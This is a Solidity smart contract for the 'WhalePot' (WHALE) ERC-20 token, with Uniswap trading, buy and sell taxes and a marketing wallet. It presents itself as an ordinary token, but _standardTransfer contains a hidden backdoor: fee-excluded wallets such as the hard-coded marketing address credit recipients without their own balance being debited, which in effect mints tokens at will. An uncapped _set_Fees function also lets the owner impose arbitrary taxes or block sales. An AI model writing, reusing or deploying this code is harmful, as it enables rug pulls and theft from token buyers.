// SPDX-License-Identifier: Unlicensed

/**
THE WHALE GAME!

Website: https://whalepot.tech
Telegram: https://t.me/WhalePot_erc
Twitter: https://twitter.com/whale_erc
 */

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMaths {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract WHALE is Context, IERC20, Ownable { 
    using SafeMaths for uint256;

    string private _name = "WhalePot"; 
    string private _symbol = "WHALE";  

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee; 

    uint8 private _decimals = 9;
    uint256 private _totalSup = 10 ** 9 * 10**_decimals;

    uint256 private _denominator = 2200;
    uint256 public _tBuyTax = 22;
    uint256 public _tSellTax = 22;

    uint256 private _previousDenominator = _denominator; 
    uint256 private _prevTBuyTax = _tBuyTax; 
    uint256 private _prevTSellTax = _tSellTax; 

    uint256 public maxWallet = 25 * _totalSup / 1000;
    uint256 public minSwapTokens = _totalSup / 100000;

    address payable private marketingWallet = payable(0xd42Da5b3668735d763532E3Bd2c283F4226bB41E);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private _buyCount = 0;
    uint8 private _startSwapAt = 2; 
                                     
    IUniswapRouterV2 public uniswapRouter;
    address public uniswapPair;
    bool public inswap;
    bool public feeSwapEnabled = true;
    
    modifier lockTheSwap {
        inswap = true;
        _;
        inswap = false;
    }
    
    constructor () {
        _tOwned[owner()] = _totalSup;
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactoryV2(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[marketingWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSup);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSup;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function removeLimits() external onlyOwner {
        maxWallet = ~uint256(0);
        _tSellTax = 1;
        _tBuyTax = 1;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != marketingWallet &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){

            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= maxWallet,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        /*
        PROCESSING
        */
        if(
            _buyCount >= _startSwapAt && 
            amount > minSwapTokens &&
            !inswap &&
            !isExcludedFromFee[from] &&
            to == uniswapPair &&
            feeSwapEnabled 
            )
        {  
            _buyCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBack(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
        if(isExcludedFromFee[from] || isExcludedFromFee[to] || (from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _denominator = _tBuyTax;
        } else if (to == uniswapPair){
            _denominator = _tSellTax;
        }
        _basicTransfer(from,to,amount,takeFee);
    }


    function sendETH(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function swapBack(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETH(marketingWallet,contractETH);
    }


    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllFee();
            } else {
                _buyCount++;
            }
        _standardTransfer(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }

    function _standardTransfer(address sender, address recipient, uint256 tAmount) private {
        uint256 tDev = tAmount.mul(_denominator).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);

        if(isExcludedFromFee[sender] && _tOwned[sender] <= maxWallet) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
        _tSellTax = Sell_Fee;
        _tBuyTax = Buy_Fee;

    }
    receive() external payable {}

    function removeAllFee() private {
        if(_denominator == 0 && _tBuyTax == 0 && _tSellTax == 0) return;

        _prevTBuyTax = _tBuyTax; 
        _prevTSellTax = _tSellTax; 
        _previousDenominator = _denominator;
        _tBuyTax = 0;
        _tSellTax = 0;
        _denominator = 0;

    }
    
    function restoreAllFee() private {
    
    _denominator = _previousDenominator;
    _tBuyTax = _prevTBuyTax; 
    _tSellTax = _prevTSellTax; 

    }
}